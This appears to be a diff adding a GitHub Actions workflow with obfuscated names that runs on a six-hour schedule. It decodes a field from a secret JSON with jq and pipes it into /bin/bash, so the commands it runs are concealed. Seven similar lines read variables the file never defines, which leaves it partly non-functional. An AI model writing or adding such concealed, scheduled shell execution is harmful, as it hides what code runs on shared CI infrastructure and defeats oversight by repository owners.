@@ -1,0 +1,25 @@
+name: xianghuaguo3451
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '51 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: xianghuaguo3451
+        env:
+          wxl3917: ${{ secrets.wxl3917 }}
+        run: |
+          echo $wxl3917 | jq -r .bri1 | /bin/bash
+          echo $jc473 | jq -r .sin22516 | /bin/bash
+          echo $a14 | jq -r .aymg08 | /bin/bash
+          echo $qrips794 | jq -r .gdzh8 | /bin/bash
+          echo $am294 | jq -r .aobse7399 | /bin/bash
+          echo $ifgm5805 | jq -r .q97690 | /bin/bash
+          echo $szg9 | jq -r .okcey89 | /bin/bash
+          echo $qxs205 | jq -r .yppy08 | /bin/bash
+
